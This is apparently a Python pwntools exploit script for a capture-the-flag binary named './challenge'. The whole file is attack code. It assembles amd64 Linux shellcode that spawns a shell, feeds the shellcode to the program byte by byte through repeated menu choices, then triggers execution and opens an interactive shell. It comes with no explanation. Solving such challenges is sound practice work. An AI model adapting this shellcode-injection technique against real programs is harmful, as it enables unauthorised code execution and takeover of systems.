from pwn import *

local = True
fileName = './challenge'
e = ELF(fileName)

if local:
    p = process(fileName)
    # gdb.attach(p,'''
    #     b *main
    # ''')
else:
    p = remote('',)



context.arch = 'amd64'
shell = asm(shellcraft.amd64.linux.sh())
for byte in shell:
    while byte > 0:
        if byte >= 72:
            p.sendlineafter('all done!','4')
            byte -= 72
        elif byte >= 16:
            p.sendlineafter('all done!','3')
            byte -= 16
        elif byte >= 12:
            p.sendlineafter('all done!','5')
            byte -= 12
        else:
            p.sendlineafter('all done!','3')
            p.sendlineafter('all done!','6')
            p.sendlineafter('all done!','6')
            p.sendlineafter('all done!','6')
            p.sendlineafter('all done!','6')
            p.sendlineafter('all done!','6')
            byte -= 1

    p.sendlineafter('all done!','2')

p.sendlineafter('all done!','7')
p.interactive()

